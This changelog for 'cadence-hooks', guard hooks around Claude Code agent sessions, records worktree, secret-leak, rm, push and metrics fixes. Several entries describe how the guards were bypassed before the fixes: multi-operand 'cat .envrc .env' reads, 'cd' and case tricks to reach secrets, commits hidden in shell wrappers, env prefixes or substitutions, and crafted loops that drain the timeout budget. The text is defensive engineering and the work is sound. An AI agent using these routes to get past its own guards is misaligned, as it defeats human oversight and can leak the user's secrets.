- **`warn-main-branch` now honors a *repo-declared* `CADENCE_ALLOW_MAIN`, collapsing an asymmetry with `enforce-worktree` (cadence-hooks#164, PR3).** The nudge read `CADENCE_ALLOW_MAIN` from *process env only*, while `enforce-worktree` also respects the flag declared in a repo's own `.claude/settings.json` `env` block — so a by-design-`main` repo (dotfiles, a vault) that opted out in its settings still got nudged on `main`. Warn's env-only reader and its duplicate truthy parser collapse onto the shared `worktree::is_truthy` + `config::repo_env_flag` resolution `enforce-worktree` already uses (env, else primary-checkout repo-declared). This is the sole intended behavior change; the snooze/marker `repo_root` key intentionally keeps its git-canonical resolution so an armed dismissal still suppresses, and every other verdict stays characterization-locked.
- **`session warn-branch-intent` resolves the current branch through the shared `core::gitstate::GitState` (cadence-hooks#164).** Its gate-2 `git branch --show-current` spawn becomes a pure-filesystem `HEAD` read — the fifth and last family branch resolver (the umbrella's "4" undercounted; this one lives in the `session` crate). A detached HEAD resolves to `None`, which gate 2 already treats identically to the old empty-string result, so verdicts are unchanged. The staleness probes (rev-list ahead-count, tip date) stay `git_command` — facts `GitState` does not carry.
- **`warn-subagent-worktree` resolves the spawning session's repo and primary-vs-worktree state through the shared `core::gitstate::GitState` (cadence-hooks#164, PR2).** The guard's `git rev-parse --show-toplevel` spawn and its guard-local `.git`-is-dir check collapse onto one pure-filesystem resolution (a git spawn removed, aligning with #271's spawn-reduction); the sibling-worktree count stays a `git worktree list` spawn since it is not a per-path fact (`count_worktrees` lifted to `pub(crate)` for future sharing). The `assess_spawn` decision is untouched — verdicts are characterization-locked, now with a real-repo seam test proving a dispatch from the primary nudges while one from inside a linked worktree does not.

### Added

- **Two pure `core` modules give the git/branch guard family one tested notion of "what kind of path / repo / branch is this?" (cadence-hooks#164, PR1 of the umbrella).** `core::pathclass` generalizes `guard-rm`'s shipped `classify_path`/`TargetClass` prototype into a shared `path → PathClass` map — `Temp`, `ClaudeManaged`, `DocsPlans`, `HomeChild`, `GitRoot`, `Source` — preserving the load-bearing ALLOW-before-BLOCK precedence and folding in #152's lexical `..` normalization so no carve-out ever matches an uncanonicalized path. `core::gitstate::GitState::resolve` exposes `repo_root`, `git_common_dir`, `branch`, `worktree_kind` (primary/linked), and `default_branch` from a filesystem walk (no `git` spawn), built on the existing `paths::find_git_root` + `resolve_git_common_dir`; `repo_root` and `git_common_dir` are **canonicalized** (`..` and symlinks resolved) so they are directly comparable and match git's own `--path-format=absolute` output — a primary checkout and a linked worktree of the same repo resolve to one identical `git_common_dir`, which any consumer scoping "same repo" by comparing common dirs relies on (`resolve_git_common_dir` alone returns an un-normalized `…/.git/worktrees/<wt>/../..`, and the two sides can further split on `/var` vs `/private/var` symlink forms). Both expose **facts, not policy** — no `is_main`/block/allow verdict — so a shared classifier feeding a BLOCK guard can never drift one guard's decision (or fail-direction) into another's. `guard-rm` is refactored as `pathclass`'s first consumer with **byte-identical verdicts** (all 53 existing tests unchanged); the incident history (#152/#33/#35) is captured as a seed-corpus regression suite. Additive — no other guard consumes the modules yet, so this PR changes structure, never a decision. `memory`/`vault` classes deferred to land with their second consumer (D5).

## [0.56.0] - 2026-07-10

### Added

- **`enforce-worktree` now *nudges* (exit 0) on subprocess tree-mutations in the session's own primary checkout (#234)** — its first advisory tier. A Bash command that mutates tracked files without a `git commit` — a package-manager manifest mutator (`uv add|remove|sync`, `cargo add|rm`, `pip/npm/pnpm/poetry/yarn install|add`, …), a direct file mutator (`sed -i`, `tee`), or a `>`/`>>` redirect into a tracked file — previously slipped past silently and accumulated in the shared tree until the eventual `git commit`/`Write` tripwire fired, by which point unwinding was costly. The nudge raises that class from silent-allow to advisory. It rides the **same #228-safe scoped walk** as the commit-block channel (reusing its `cd`-tracking and child-script recursion, never the flat `command_segments` bypass primitive), is scoped to the session's OWN checkout like the Edit/Write arm (git-common-dir equality), and honors every existing exemption (process/repo `CADENCE_ALLOW_MAIN`, the `CADENCE_NO_ENFORCE_WORKTREE` kill switch, temp-root, `.claude/`/`docs/plans/` carve-outs, and the shared `dismiss-enforce-worktree` snooze — no new dismiss key). Per the composition contract it is evaluated **only after** the commit channel finds no block, so `uv add && git commit` into the primary still BLOCKS (commit wins) rather than double-firing. Coarse v1 taxonomy with named accepted misses (non-enumerated verbs, `$VAR`/`$(…)`-pathed and prefix-flag-wrapped targets, `git apply|restore|rm|mv`). The `>>`-aware redirect parser (`redirect_targets`) was promoted to `core::shell` so `prevent-secret-writes` and `enforce-worktree` share one guard-feeding parser.

### Changed

- **`warn-branch-base` folds in an early worktree-first nudge (Refs #276).** `git checkout -b`/`git switch -c` in a **primary checkout** under worktree discipline — the same state `enforce-worktree` would gate a mutation in, via the shared `would_block_here` primitive — now nudges toward creating a worktree instead, regardless of which base is named. This replaces the guard's old "switch to main first" advice for that case, which wrongly presumed branching in place was fine as long as the base was main; in a primary checkout, branching in place at all is the anti-pattern `enforce-worktree` exists to prevent. A linked worktree, an exempted repo (`CADENCE_ALLOW_MAIN`, `CADENCE_NO_ENFORCE_WORKTREE`, temp root), or an unresolvable cwd falls through to the original base-branch check, unchanged.

## [0.55.0] - 2026-07-10

### Fixed

- **P0 #271 mitigation: every git subprocess is now wall-clock bounded under a shared per-process deadline, so guards degrade to *observable* fail-open instead of being silently killed by the external hooks.json timeout.** On a host with slow subprocess I/O (cloud-synced `.git`, endpoint-protection scanning, heavy concurrent-session load), unbounded `git` probes rode hook processes past their 5s budget; Claude Code kills a timed-out hook from outside and fails open, so the guard suite added ~5s of latency per tool call while silently not enforcing — and a killed process can't log its own death. The new `core::deadline` budget (`CADENCE_HOOK_DEADLINE_MS`, default 3000ms; `0` disables; positive values clamp up to a 1000ms floor because a tiny value injected via a repo `.envrc` would be a guard-softening primitive) is armed at hook dispatch and shared across a process's spawns — a pre-exhausted budget skips the spawn entirely. The bounded runner (`core::shell::run_git_bounded`) kills and reaps the child at the deadline, drains stdout on a thread (no 64KB pipe-buffer deadlock), sets `GIT_OPTIONAL_LOCKS=0` on every spawn, and returns a tri-state so callers distinguish "git answered badly" from "git never answered". The deadline bounds in-process git time only — the wrapper/fork-exec slice before `main` is outside its reach (that residual belongs to the process-fan-out follow-up).
- **Three fail-closed guard arms no longer convert a timed-out git probe into a false block** — each gates on its *own* resolution's timeout, never a process-global flag: `cadence git-safety`'s bare-`HEAD` force-push arm (a routine `git push --force origin HEAD` on the slow host would have been blocked as "unresolvable current branch"), `guardrails guard-push-remote`'s unresolvable-push-target arm, and `guardrails guard-gh-write`'s unresolvable-repo arm (single commands and relaxed no-`cd` loops). A genuine resolution failure — git answered, target truly ambiguous — still blocks exactly as before. In `guard-gh-write`, the ownership-deciding `origin` probe now runs before the optional `upstream` fork refinement so the refinement can't starve it under a shared budget, and a timed-out `upstream` never degrades to origin-only judgment (in a fork clone that would be a wrong-target allow).
- **`guard-push-remote` resists induced budget exhaustion.** Its push-loop arm resolves one git probe per looped remote — a command-controlled count — so a crafted loop flooding remotes ahead of a real unowned push could have drained the shared deadline and let the ownership-deciding probe time out into a fail-open. A push loop is rare and batchable, so the loop arm now fails **closed** on *any* resolution timeout ("run pushes individually so each remote is validated") — a structural fix that holds even on a slow host, where each probe is already slow enough to defeat a completion-count heuristic. The single-command path keeps its fail-open (a normal `git push` on a slow host must not false-block). `CADENCE_HOOK_DEADLINE_MS` also gains an upper clamp (4500ms, under the tightest external timeout) so a repo-injected huge value can't silently neutralize the mitigation — use `0` to disable deliberately.

### Added

- **Two new `failopen.jsonl` reasons (additive; schemaVersion stays 1) make the degradation loud:** `deadline` — git probes were abandoned at the budget and guards took their ordinary fail-open arms; `deadline_block_suppressed` — a fail-closed arm downgraded an actual block, i.e. enforcement was bypassed, not just slowed. Both come with a stderr breadcrumb, and `cadence-hooks doctor` warns at ≥3 `deadline` rows in the window (load-correlated, like `parse`) and at ≥1 suppressed block (each one is an enforcement block that did not fire). Session `heartbeat`/`end`/`backstop-record` migrate to the logged dispatcher so their deadline hits have an emission path (they gain `hooks.jsonl` timing rows as a side effect).
- **A spawn-budget regression test pins `enforce-worktree`'s Edit/Write arm at ≤3 git spawns** (a counting fake-`git` shim), so the next accidental per-edit probe is a red CI run instead of a field P0 — the count had grown from ~1 to 4-5 across v0.48–0.49 unnoticed.
- **`cadence-hooks doctor` now scans recent Claude Code session logs for slow cadence hook runs** — the one place a guard's degradation is recorded when the binary can't self-report (an externally-killed process logs nothing, and a pure-CPU guard starved by fork/exec contention never touches the internal deadline). It reports, per subcommand, the count of runs ≥1000ms (healthy is well under 250ms) plus any `hook_cancelled`, with the max observed duration — the table #271's reporter built by hand, automated. Read-only, bounded to the 50 most-recent logs by mtime, and PII-free (subcommand names + counts + durations only). Note: session logs carry no explicit "killed at the timeout budget" field, so this measures *latency* (the real signal), not kills.

### Changed

- **`enforce-worktree` drops from 4-5 git spawns to 3 per Edit/Write** via a per-invocation `GitProbe` memo (common-dir and repo-root asked of git once per directory), with the snooze marker and its provenance sidecar now read through the already-resolved common dir — pure filesystem, no extra spawns, and writer/reader marker anchors provably match. A resolved repo whose common-dir probe times out now allows (snooze state unreadable — the guard's own infrastructure failure never blocks, ADR-0001) instead of risking a false block through an active dismissal.

## [0.54.0] - 2026-07-09

### Added

- **`metrics log-ask-user-question` now widens to a dual `asked`/`answered` event, closing UU-6 of the 2026-07-08 methodology-coverage blind-spot pass (plan PR cameronsjo/cadence-hooks#260).** Previously the logger only reacted to `PreToolUse`, so a user's selected answer — and any "Other" free-text — died with the transcript the moment the conversation scrolled past. It now also accepts `PostToolUse`, following `log_plan_phase.rs`'s dual-event precedent: one subcommand, one stream (`askuserquestion.jsonl`), a `phase: "asked"|"answered"` discriminator, born `schemaVersion: 1`. Per Decision D1-a (Cameron, plan review), the `answered` record logs each question's selected label or free-text answer **verbatim, unredacted** — this stream's whole value is the user's why, and it lives in the same trust domain (`~/.claude/metrics/`) as the transcript itself — plus `matchedRecommended`, reusing the shared `(Recommended)`-marker predicate so it never drifts from the `warn-recommended-option` nudge's own stance classifier. The plugin-side `PostToolUse:AskUserQuestion` matcher (`plugins/cadence-metrics/hooks/hooks.json`, cadence monorepo) is a release-gated companion — it merges only after this release ships, so the release-gate ordering (binary first) matters for more than doctor's `hooks-skew` gate: a negative-control run confirmed the **pre**-widening logger never gated on `hook_event_name` at all, only on `tool_input.questions` presence — and a real `PostToolUse` payload still carries `tool_input.questions` (mirrored back), so an out-of-order rollout wouldn't have no-op'd, it would have double-logged the same call under the old schema-v0 shape (fail-open, exit 0 — never an error, just a duplicate row). This widening closes that gap on both sides by branching explicitly on `hook_event_name`.

## [0.53.0] - 2026-07-08

### Added

- **New `guardrails guard-rm` hook — path-aware triage of `rm`-family delete commands (#261).** Instead of a blanket permission prompt on every recursive delete, guard-rm inspects each command's deletion targets and returns a graduated decision: **ALLOW** (silent) for a target under a temp root (`/tmp`, `/private/tmp`, `$TMPDIR`) or strictly under a `.claude/` directory (worktrees, session dirs, scratchpads); **BLOCK** (exit 2, disclosed message) for `/`, `$HOME`, a first-level home child, inside `$OBSIDIAN_VAULT`, or a git repo root / any path with a `.git` component; and **ASK** (a new core outcome — see below) for an unexpanded variable, a command substitution, a `..`-bearing path, or anything else not proven safe (the default). A *discipline guard with an allow-granting edge*, not a security boundary: it fails open (ADR-0001) and is deliberately **not** in `PROTECTED_GUARDS`, so `CADENCE_DISABLE=guard-rm` may neuter it. Verb detection basename-matches the transparent-prefix-stripped leading word against `rm`/`unlink`/`shred`/`truncate` (plus `find … -delete`), so `git rm`, `npm rm`, and look-alikes like `charm` are correctly not deletions. Targets are collected by mirroring `enforce_worktree::collect_commit_targets` — walking segments while tracking the effective cwd through `cd` chains and recursing into `sh -c '…'` wrappers and `$(…)`/backtick bodies with a fresh scope, never flattening via `command_segments` (issue #228). The plugin `Bash`-matcher wiring is a release-gated companion — it merges only once this release ships the subcommand (doctor `hooks-skew` gate).
- **New `Outcome::Ask` in the core hook protocol.** A guard can now emit a PreToolUse `permissionDecision: "ask"` envelope (exit 0) to force the interactive permission prompt on an operation it can neither prove safe (Allow) nor prove dangerous (Block). Per Claude Code's most-restrictive precedence (`deny` > `defer` > `ask` > `allow`), an `ask` decision prompts the user even when a settings `allow` rule would otherwise auto-approve. `decision_for` maps it to a `"ask"` row in `denials.jsonl`, logged unconditionally (like a hard deny) so a proving period sees guard interventions, not just blocks.
- **`sweep_stale` (the session-registry reaper behind the PostToolUse heartbeat and `session start`) now logs every reap to `sweeps.jsonl` (cameronsjo/cadence-hooks#259).** Cross-machine/cross-session liveness sweeps were previously invisible. Each row carries the reaping `trigger` (`"heartbeat"` | `"start"`), the reaped file's `sessionId`/`name` when it still parsed, and its age at reap time — a best-effort identity parse that never gates the delete it's recording.
- **The binary's three fail-open paths — a caught panic, a stdin-parse failure, and clap version-skew — now log to `failopen.jsonl` (cameronsjo/cadence-hooks#259).** Every row carries `reason` (`"panic"|"parse"|"version_mismatch"`), the attempted `namespace`/`subcommand` when known, and the running `binaryVersion`. Both new streams ride the existing JSONL rail on `<metrics_dir>/`, consistent with `denials.jsonl`/`hooks.jsonl`/`bypasses.jsonl` — wiring them into a fuller OTLP-based observability stack is a named follow-up, not this change.
- **`cadence-hooks doctor` now surfaces both new streams.** An informational (non-blocking) line reports recent session-registry sweep counts. Fail-open counts warn on ≥1 panic, ≥3 parse failures, or ≥1 `version_mismatch` in the last 7 days — the `version_mismatch` check counts only rows tagged with the *currently installed* binary's own version, so a sanctioned new-hooks.json/old-binary release transition doesn't alarm; a recurrence on the current version means the skew didn't resolve.

## [0.52.0] - 2026-07-07

### Added

- **New `metrics log-skill` subcommand + `skills.jsonl` stream — one row per `Skill` tool invocation (cameronsjo/cadence-hooks#215).** A lightweight audit log (sibling of `subagents.jsonl`), born with `schemaVersion: 1`. Records the invoked `skill` id in clear (a `plugin:directory` name, needed for the co-fire matrix) plus `argsHash` — a non-reversible `DefaultHasher` digest of the skill's argument string. The **raw args are never written**; privacy-by-construction, empirically verified against secret-shaped args, malformed payloads, and `CADENCE_METRICS_DEBUG=1` (whose `_keys` carries top-level key names only). Reads two new additive `skill`/`args` fields on the shared `ToolInput`. The plugin `Skill` matcher that drives this is a release-gated companion — it merges only once this release ships the subcommand (doctor `hooks-skew` gate).

## [0.51.0] - 2026-07-07

### Added

- **The `schemaVersion` metrics-stream convention is now centralized with an explicit bump policy (cameronsjo/cadence#238).** `plan-phases.jsonl` piloted a per-file `SCHEMA_VERSION` constant (shipped 0.47.0); that value now lives in `crates/metrics/src/common.rs` as `PLAN_PHASE_SCHEMA_VERSION`, read from one source, alongside a documented additive-vs-breaking bump policy (Keep-a-Changelog for the data contract). No row shape changes — `plan-phases.jsonl` still emits `schemaVersion: 1`. New streams are born versioned; the four pre-existing v0 streams (`commits`/`subagents`/`denials`/`sessions`) adopt the field on their *next* shape change (opportunistic adoption), and historical un-stamped lines are never backfilled.

## [0.50.0] - 2026-07-07

### Added

- **`session start`'s SessionStart disclosure now surfaces a worktree-posture line before the first Edit/Write ever runs (#236).** Previously `enforce-worktree`'s hard block was only ever announced by hitting it — a primary checkout of a branch-mode repo gave no signal at session start that the very first mutation would be blocked. `run_start` now emits `Branch-mode repo, primary checkout: feature work starts in a worktree (EnterWorktree / git worktree add) — the first Edit/Write here will be blocked.` whenever `enforce-worktree` would actually block a mutation there — honoring every exemption (`CADENCE_ALLOW_MAIN` env and repo-declared, `CADENCE_NO_ENFORCE_WORKTREE`, a temp-root checkout, an active `dismiss-enforce-worktree` snooze, and the `.claude/`/`docs/plans/` carve-out) — and fires even when the room is empty of peers, a case that previously returned a silent Allow. The block predicate is a new shared `cadence_hooks_core::worktree::would_block_here`, lifted out of `enforce_worktree` into `crates/core` so the posture line and the real block share one source of truth and can never drift apart; `enforce_worktree`, `warn_main_branch`, and `dismiss_enforce_worktree` now delegate their own primitives (`is_primary_checkout`, `is_temp_root`, `is_claude_managed_dir`, `is_plan_doc_dir`, `is_snoozed_now`, `should_block`) to the same module. No new subcommand, no `hooks.json` change — the line rides the existing `session start` disclosure and ships on the next binary release.
- **`doctor --prune` lists orphaned plugin-cache version dirs (dry-run default); `doctor --prune --apply` removes them; `--apply` alone is a usage error (#200).**

### Security

- **`doctor --prune`'s orphan scan is now contained to the plugin-cache root, and never treats an active pinned sibling as an orphan (#200 follow-up).** `manifest_install_paths` read each `installPath` from `installed_plugins.json` verbatim, with no check that it resolved under the plugin cache — a manifest entry pointing outside it (`/etc`, a `..`-climbing relative path) steered the sibling scan at that location instead, and `--apply` would `remove_dir_all` real directories having nothing to do with the plugin cache. Separately, `orphan_dirs` excluded only the *current* pin's own basename per parent, so two active pins sharing a parent (multi-scope installs, or two SHAs of one plugin key) each nominated the *other* as an orphan, and `--apply` deleted both live installs. `orphan_dirs` now skips any pin whose `installPath` doesn't resolve under the resolved cache root (`--root` under `--root`, else the live `~/.claude/plugins/cache`) before ever scanning its parent, and groups pinned basenames by parent so a scan excludes every active pin sharing it, not just the one being processed. `prune_orphans` adds the same containment check immediately before `remove_dir_all` as defense in depth, skipping (with a stderr warning) rather than removing anything outside the root.
### Fixed

- **The Obsidian trash-guard now blocks clobber redirects that would truncate an existing vault file (#192).** `rm`/`unlink`/`shred`/`truncate`/`find -delete` were already caught, but a clobbering redirect into an existing vault file bypassed the guard entirely — the shell truncates the target the moment it opens the file for writing, independent of whether the command itself is destructive. A new core `clobber_redirect_targets` helper (`crates/core/src/shell.rs`) extracts only truncating-redirect targets from a command segment, excluding append redirects and file-descriptor duplication; the guard resolves each target against `cwd`/vault and, via an injected filesystem-existence seam, blocks only when the target already exists on disk. Redirecting into a new filename, or appending, remains allowed. A security review of the initial fix found four bypasses, now closed: the redirect loop now scans `command_segments` (not `split_segments`) so a redirect hidden inside a `sh -c`/`bash -c` wrapper or a `$(…)`/backtick substitution is still caught; a backslash-escaped space in a target no longer truncates the filename early (Obsidian filenames routinely contain spaces); a glued closing `)`/`}` from subshell grouping (`(: > note.md)`) is stripped from the resolved target instead of producing a nonexistent path; and `.`/`..` segments in the resolved path are now lexically collapsed before the vault-membership test, so a `..` climb that lands back inside the vault is caught (and, symmetrically, a `..` climb that lands genuinely outside the vault is no longer over-blocked).
- **`prevent-secret-leaks`'s Bash read path now applies the pure-loader `.envrc` content carve-out (#193), the carve-out only fires when EVERY dangerous operand in the segment clears it (#307), a RELATIVE `.envrc` operand is refused whenever the command also changes directory (#308), and original-case recovery for a multi-operand command is now position-correct rather than first-occurrence.** Reading a direnv loader-only `.envrc` via a shell command (e.g. `cat .envrc`) is now allowed when the on-disk content proves it carries no secret; a secret-bearing or unreadable/absent `.envrc` still blocks. The initial carve-out judged only the first dangerous operand in a segment, so `cat .envrc .env` (or `paste`/`head .envrc .env`) let a proven pure-loader `.envrc` amnesty the *whole segment*, and the sibling `.env` operand was never examined — a multi-operand leak; the scan now considers every dangerous operand per segment and blocks if any one of them isn't a proven pure-loader `.envrc`. Separately, the carve-out resolved a relative operand against the static `input.cwd`, but never accounted for an in-command `cd`/`pushd`/`popd` moving the shell's real cwd elsewhere first — `cd /elsewhere && cat .envrc` classified `$cwd/.envrc` (a clean loader at the tool call's cwd) while the shell actually read `/elsewhere/.envrc` (a secret); a relative `.envrc` operand now loses the carve-out whenever the command contains a directory change (an absolute `.envrc` operand is unaffected, since its resolution never depends on cwd). A third leak was case-sensitivity-specific (invisible on macOS's default case-insensitive APFS, live on Linux and any case-sensitive volume): the guard lowercases the whole command before classifying, so `cat .envrc .ENVRC` — two DISTINCT files on a case-sensitive filesystem — both produced the lowercased operand `.envrc`, and recovering original case at the FIRST occurrence resolved BOTH operands to the loader file, never actually reading the secret `.ENVRC`. Original-case recovery now threads a monotonic cursor across every operand in command order, so the Nth lowercased occurrence recovers the Nth real occurrence; a recovery that can't be resolved from the cursor fails closed (blocks) rather than falling back to the lowercased token. Mirrors the existing Read/Grep-arm carve-out.
- **`guard-gh-write` no longer flags gh-write phrases inside quoted arguments of non-gh commands (#212).** The no-loop write scan matched `WRITE_ACTIONS` against a whole command segment, so a `git commit -m "…gh repo create…"` message describing a gh write was misread as one. The write scan now runs only on a segment that carries an *unquoted* `gh` command token (bare, a `*/gh` path, or a backslash-escaped form) — a quoted message tokenizes as a single non-`gh` token, so it is skipped, while every real gh write still surfaces a bare `gh` token, including behind an env-assignment (`GH_TOKEN=… gh …`), a transparent prefix (`sudo`/`env`/`command`/`exec` `gh …`), an argument position (`xargs gh …`, `find … -exec gh …`), or a leading redirect. The gate skips a strict subset of the prior substring scan, so it adds no false negative — a first-token-only gate would have silently dropped all of those prefixed writes.
- **`parse_work_dir` now assumes every `cd` succeeds, aligning the nudge-tier resolver with `git_commit_targets` (#229).** It carried a "`cd` before `||` is a no-op" heuristic that `git_commit_targets` had already abandoned in #226: because bash's `||`/`&&` are equal-precedence and left-associative, the common `cd x || exit; git push` idiom pushes from `x` whenever the `cd` works, so skipping that `cd` misjudged the effective directory. Both resolvers now apply every `cd` the pattern finds, in order. Nudge-tier consumers only (`guard_push_remote`, `nudge_upgrade_after_push`, `guard_gh_write`, `warn_issue_tracker`, `git_safety`, markers, loop-analysis) — no block guard consumes it functionally, so the worst case is a corrected nudge, not a changed block.
- **`enforce-worktree`'s commit detection now sees through shell wrappers, command substitutions, and environment prefixes (#228, #230).** A `sh -c 'git commit …'` / `bash -c "…"` / `zsh -c '…'` wrapper hid the commit behind the wrapper's leading word, and `env git commit`, `env VAR=x git commit`, or a bare `VAR=x git commit` assignment prefix slipped the leading-word gate — all silent misses on the guard's hard security boundary. Commit detection now recurses into each segment's *child scripts* — the wrapper's `-c` script and `$(…)`/backtick substitution bodies (which also execute, and are unioned so `bash -c 'true' "$(git commit)"` sees both) — via a new `core::shell::child_scripts` seam, and the prefix-skipper handles `env` plus leading `NAME=value` assignment words. Prefix-stripping runs *before* wrapper detection, so the two transparency mechanisms compose — `env GIT_AUTHOR_NAME=x bash -c 'git commit'` and `exec sh -c 'git commit'` are seen, not just a bare leading wrapper. The recursion is deliberately **scoped rather than flat**: each child inherits the tracked directory in effect at its segment (`cd /wt && sh -c 'git commit'` resolves to `/wt`) but its own `cd`s never leak back out — a flat `command_segments` splice would let `echo "$(cd /elsewhere)" && git commit` move the tracked directory and silently ALLOW a commit that really lands in the primary the shell is standing in. Single-quoted substitutions stay unexpanded (nothing executes there), `env -i git commit` stays a documented miss (env's own flags aren't parsed, mirroring `nice -n 10`), and depth shares `command_segments`' wrapper budget. The quoted-token facets of #230 (`"git" commit`, quoted `-C "/spaced path"`) were fixed structurally by #241's shared quote-aware tokenize; this change adds the regression tests proving them.
- **`enforce-worktree`'s commit-target resolver no longer misjudges POSIX-shaped shell paths as relative on Windows (#235).** The `-C <path>` redirect decision used `Path::new(path).is_absolute()`, which is `false` on Windows for a leading-`/` path like `/some/worktree` (no drive letter) — so a POSIX shell path (WSL, Git-Bash) resolved as if relative to `effective_dir`, breaking `Check (windows-latest)` on `main` since #226. A new `is_shell_absolute` helper treats a leading `/` as absolute on every platform (these are shell paths a command string carries, not OS paths) before falling back to the platform's own `is_absolute` for native `C:\…` paths — no behavior change on unix. Six fixture tests that construct real Windows-shaped disk paths through `tokenize` (which is documented escape-unaware for backslashes) are `#[cfg(unix)]`-gated rather than fixed at the tokenizer level — a guard-feeding parser change is out of scope here and deferred; a new `#[cfg(windows)]` test proves a native drive-lettered path still resolves correctly through the same helper.

## [0.49.0] - 2026-07-06

### Fixed

- **`enforce-worktree`'s `Edit`/`Write`/`MultiEdit` arm is now scoped to the session's own checkout (#238).** The arm judged only the *target file's* enclosing repo — `git rev-parse --show-toplevel` walking up from the file — in isolation from the session, so a legitimate foreign-location write blocked whenever the target happened to land in some primary checkout on `main`: a field report dropped into a git-backed Obsidian vault, a note into a version-controlled `~/Documents` tree, a file into a sibling repo. All three are foreign artifact-drops, not feature work in the session's own shared tree, yet the guard imposed worktree discipline on them — and the block message told the user to `git worktree add` inside a *vault*. The arm now enforces only when the target file's repo is the same repo the session's cwd is in — matched by **git common dir** (`--git-common-dir`), so a repo and its linked worktrees count as one repo, and a write into your own primary tree from a worktree still blocks while a write into a genuinely different repo does not. A write into any *other* repo — or a target/cwd git can't resolve to a repo — is out of scope and allowed. The **`git commit` arm is unchanged**: it still judges every commit target, so *persisting* into a foreign primary still blocks (#224) even where *writing* a file there does not — a deliberate asymmetry, since a stray write is cheap and reversible while a commit onto another checkout's `main` is the collision this guard exists to stop. This also retires the misdirecting foreign-repo block message and the auto-memory/`~/.claude` false-block, both of which only fired because those writes were judged against a foreign repo. `CADENCE_ALLOW_MAIN` continues to cover the orthogonal "session rooted in a main-mode repo (vault/dotfiles)" case. Fail-open per ADR-0001 — this is a discipline nudge, not a security boundary, so relaxing an over-broad arm is aligned: a missed nudge is cheap, a false block is friction.
- **`enforce-worktree`'s `.claude/`/`docs/plans/` carve-out no longer leaks onto the `git commit` arm (#239 F6/F7).** The carve-out lived in the shared `assess_dir`, which the commit arm also calls with the commit's *target directory* — so `cd .claude && git commit` or `cd docs/plans && git commit` short-circuited to allow before repo detection ever ran, letting a repo-wide change ride onto `main` disk-free (and even reversing #224's cross-repo block by appending `/.claude` to another primary's path). A commit's cwd doesn't scope which files it commits, so the carve-out was never right for that arm. It now lives on the Edit/Write arm only — where the *file being edited* being Claude-managed state or an approved plan doc is the actual intent — and the commit arm assesses carve-out-free. The sanctioned "commit an approved plan doc on `main`" path stays the `dismiss` snooze.
- **`enforce-worktree`'s commit detection is now quote-aware and sees through shell grouping and transparent prefixes (#239 F4/F5/F9, issue #230).** The `git` flag-walk used quote-blind `split_whitespace` (while the `cd` arm already used quote-aware `tokenize`), so a spaced quoted value — `git -C "/spaced/path" commit`, `git -c user.name="A B" commit` — split mid-token and the `commit` subcommand was never found, silently allowing the commit. Both arms now share one `tokenize` stream. Each segment is additionally stripped of subshell/brace grouping and transparent command prefixes, so `(git commit)`, `{ git commit; }`, `(cd <dir> && git commit)`, and `command`/`exec`/`time git commit` are detected instead of slipping the leading-word gate. Prefixes are only skipped when the following token isn't an option, so a prefix's own flags are never misparsed. The flag-walk also consumes git globals that take a *separate* value token (`--namespace ns`, `--super-prefix`, `--config-env`, `--attr-source`, alongside `-C`/`-c`), which otherwise stopped the walk on the value and hid the `commit` subcommand.
- **`enforce-worktree`'s Edit/Write arm resolves a new-subdirectory target to its nearest existing ancestor (#239 F1).** A `Write` creating a file in a not-yet-existent subtree (`<primary>/newmod/lib.rs`) had a parent dir git couldn't resolve, so the guard failed open and let a new module land in the shared primary tree. The arm now ascends to the nearest existing directory before resolving the repo; an existing target dir is unchanged (a single `exists()` stat on the hot path).
- **`enforce-worktree` dedups commit targets before assessment (#239 F11).** A pathological command repeating `git commit` N times drove N un-memoized `git rev-parse` spawns; identical targets now resolve once, bounding the hook's subprocess fan-out.
- **`repo_env_flag` tolerates a leading UTF-8 BOM in a repo's `.claude/settings.json` (#239 F10).** An editor-added BOM made `serde_json` reject the file, silently dropping a *declared* `CADENCE_ALLOW_MAIN` and false-blocking a by-design-main repo — exactly what the block message tells the user to set. The BOM is now stripped before parsing (JSONC comments/trailing commas remain a strict-parse reject; no lenient-parser dependency added).

## [0.48.0] - 2026-07-06

### Fixed

- **`enforce-worktree` now resolves a `cd <dir> && git commit` prefix — including cross-repo `cd`s — instead of only honoring the equivalent `git -C <dir> commit` (#213, #224).** The guard's commit-target resolver walked command segments looking for a leading `git`, silently dropping any `cd` segment, so `cd <worktree> && git commit` was misjudged as mutating the shell's original cwd repo while the identical-intent `git -C <worktree> commit` was already honored — a real block/allow inconsistency for the same operation. It now tracks the effective directory through a command's `cd` chain (`~` expansion, quoted paths, and multiple `cd`s accumulating) before resolving each `git commit` segment's target, so a `cd` into a worktree now passes and a `cd` into a *different* primary checkout still blocks — but now judged against, and naming, that target repo rather than the repo the shell started in. The block message adds an explicit "targets `<repo>`, judged against that repo — not `<origin>`" line whenever the two differ. Unlike `core::shell::parse_work_dir` (which feeds soft nudges on six other guards and stays unchanged), this resolver always assumes a `cd` succeeds even when immediately followed by `||` — bash's `||`/`&&` are equal precedence and left-associate, so `cd <dir> || true && git commit` commits *inside* `<dir>` whenever the cd succeeds, and reusing the nudge-oriented "cd before `||` is a no-op" heuristic here would have let such a commit slip through judged against the pre-cd cwd (a real bypass caught in review). It also skips `cd`'s own option flags (`-P`, `-L`, `--`) to find the real path argument, and treats a bare `-` (`$OLDPWD`), an unexpanded shell variable (`$VAR`), or no path argument at all as unresolvable — keeping the pre-cd directory rather than building a bogus path that resolves to no repo and fails open (a second bypass this fix introduced and review also caught, e.g. `cd -P .` misread as a target literally named `-P`).
- **`dismiss-enforce-worktree` gained a `--repo <path>` option to snooze a repo other than the current directory's**, since the guard above can now block against a `cd`-redirected *target* repo that differs from the shell's cwd — a plain `dismiss-enforce-worktree` (which always keyed off cwd) couldn't reach that marker. Defaults to the current directory when omitted, unchanged from before.
